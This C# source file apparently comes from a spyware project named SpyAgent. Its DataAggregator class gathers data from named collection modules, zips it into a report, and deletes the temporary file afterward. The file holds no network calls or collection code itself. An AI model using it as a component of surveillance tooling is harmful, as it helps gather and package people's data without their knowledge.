namespace SpyAgent.Core;

using System.IO.Compression;
using System.Text;

internal sealed class DataAggregator
{
    private readonly Dictionary<string, List<byte[]>> _data = new();
    private readonly List<string> _errors = [];
    private readonly object _lock = new();

    public void Add(string moduleName, byte[] data)
    {
        lock (_lock)
        {
            if (!_data.TryGetValue(moduleName, out var list))
            {
                list = [];
                _data[moduleName] = list;
            }
            list.Add(data);
        }
    }

    public void AddError(string moduleName, string error)
    {
        lock (_lock)
        {
            _errors.Add($"[{DateTime.UtcNow:u}] {moduleName}: {error}");
        }
    }

    public byte[] BuildReport()
    {
        lock (_lock)
        {
            if (_data.Count == 0 && _errors.Count == 0)
                return [];

            var outputPath = Path.Combine(Path.GetTempPath(), $"report_{DateTime.UtcNow:yyyyMMdd_HHmmss}.zip");
            using (var archive = ZipFile.Open(outputPath, ZipArchiveMode.Create))
            {
                foreach (var (module, entries) in _data)
                {
                    for (int i = 0; i < entries.Count; i++)
                    {
                        var entryName = $"{module}/{i:D4}.dat";
                        var entry = archive.CreateEntry(entryName, CompressionLevel.SmallestSize);
                        using var stream = entry.Open();
                        stream.Write(entries[i]);
                    }
                }

                if (_errors.Count > 0)
                {
                    var errEntry = archive.CreateEntry("errors.log", CompressionLevel.SmallestSize);
                    using var stream = errEntry.Open();
                    var content = string.Join("\n", _errors);
                    stream.Write(Encoding.UTF8.GetBytes(content));
                }
            }

            var result = File.ReadAllBytes(outputPath);
            File.Delete(outputPath);

            _data.Clear();
            _errors.Clear();

            return result;
        }
    }
}
